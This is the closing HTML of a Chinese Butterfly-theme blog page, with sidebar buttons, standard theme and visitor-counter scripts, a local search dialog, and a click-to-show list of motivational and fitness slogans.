fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="用我三生烟火，换你一世迷离,长街长，烟花繁，你挑灯回看,回得了过去，回不了当初,抬头看，人生是星辰大海,当你想要放弃时，想想当初为什么开始,因为现在的坚持正在重塑未来的你,抬头看，人生是星辰大海,你最大的冒险，是过你梦想的生活,等待完美条件的人永远无法开始,认知的边界就是命运的边界,在长大，在失去，在努力，在接受，在好好生活,如果身体是瑕疵的半成品 那就让灵魂成为永远燃烧的永动机,纵有狂风拔地起 我亦乘风破万里,汗水不会辜负你的期待,享受你每一次锻炼完后的肌肉酸痛,因为这意味昨天那个预示着懦弱你的已经被你杀死了,肌肉的酸痛预示着懦弱的离场,当你快坚持不住的时候 困难也快坚持不住了,有些事不是看到了希望才努力，而是努力了才看到了希望,在无人问津的地方历练，在万众瞩目的地方出现,破茧成蝶必经淬炼,一颗向上跳动的心脏，不该有一副下坠的躯体,向下的躯体无法承载向上的灵魂,一个人要想成长你的意志力和身体都得尽力磨砺,宝剑锋从磨砺出梅花香自苦寒来" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
